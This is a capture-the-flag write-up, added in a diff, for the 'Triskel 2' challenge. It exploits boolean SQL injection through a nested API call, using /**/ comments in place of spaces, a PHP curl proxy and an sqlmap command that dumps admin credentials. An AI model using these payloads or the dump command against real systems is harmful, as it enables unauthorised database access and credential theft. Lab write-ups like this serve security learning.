@@ -1,0 +1,87 @@
+<hr />
+
+<h2>description: SQL Injection</h2>
+
+<h1>Triskel 2: Going In</h1>
+
+<h2>Problem</h2>
+
+<p>What did you do? You shouldn't have access to this chat, but you can't do anything from it right?</p>
+
+<p>by Remsio</p>
+
+<h2>Solution</h2>
+
+<p>Taking a closer look at <code>10.0.42.200</code>, we can see that there is a GET form with the <code>search</code> parameter.</p>
+
+<p><img src="../../.gitbook/assets/4f074bb7625145dfaface66b4a1a491b.png" alt="" /></p>
+
+<p>Hence, we can use</p>
+
+<p><code>text
+GET /api/call_api.php?api=10.0.42.200?search=
+</code></p>
+
+<p>Testing out some basic payloads showed that SQL injection was possible, but spaces aren't allowed. Luckily, in MySQL, we can replace the spaces with comments (<code>/**/</code>).</p>
+
+<p>We can see that</p>
+
+<p><code>text
+/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='1
+</code></p>
+
+<p>returns us all the messages, while</p>
+
+<p><code>text
+/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='2
+</code></p>
+
+<p>does not.</p>
+
+<p>I could have scripted this myself, but I decided it was too much work and just relied on good ol' SQLMap. However, it required some fine-tuning to make sure SQLMap performs the injection correctly.</p>
+
+<p>We're doing a "GET request within a GET request", so SQLMap gets confused. I set up a local HTTP proxy as follows:</p>
+
+<p>```php
+<?php
+    // create a new cURL resource
+    $ch = curl_init();</p>
+
+<pre><code>// set URL and other appropriate options
+curl_setopt($ch, CURLOPT_URL, 'http://10.35.2.134:8100/api/call_api.php?api=10.0.42.200?search=' . $_GET['search']);
+curl_setopt($ch, CURLOPT_HEADER, false);
+
+// grab URL and pass it to the browser
+echo curl_exec($ch);
+
+// close cURL resource, and free up system resources
+curl_close($ch);
+</code></pre>
+
+<p>?>
+```</p>
+
+<p>Then, we can run SQLMap:</p>
+
+<p><code>sqlmap http://127.0.0.1/test.php?search=abc -p search --tamper=space2comment --technique=B --risk 3 --dump --threads 10 -D db -T internal_api_infos</code></p>
+
+<p>Note that we specify:</p>
+
+<ul>
+<li><code>-p search</code>: inject through the search parameter</li>
+<li><code>--tamper=space2comment</code>: modify the queries such that spaces are replaced by <code>/**/</code></li>
+<li><code>--technique=B</code>: use boolean-based injection</li>
+<li><code>--risk 3</code>: attempt OR boolean-based injection (which we found earlier)</li>
+</ul>
+
+<p>We get the admin credentials, which we can use to login to the first webpage.</p>
+
+<p><img src="../../.gitbook/assets/cdbda52f06ef451c8e1e934215fe0c56.png" alt="" /></p>
+
+<p>The remaining credentials are shown below:</p>
+
+<p><img src="../../.gitbook/assets/5b8d89aa5d2a4b2fa271edd3ec03d125.png" alt="" /></p>
+
+<p>This allows us to access the Admin page, which contains the flag.</p>
+
+<p><img src="../../.gitbook/assets/0755ec7dc5ed4c0a8417a103ce0a4054.png" alt="" /></p>
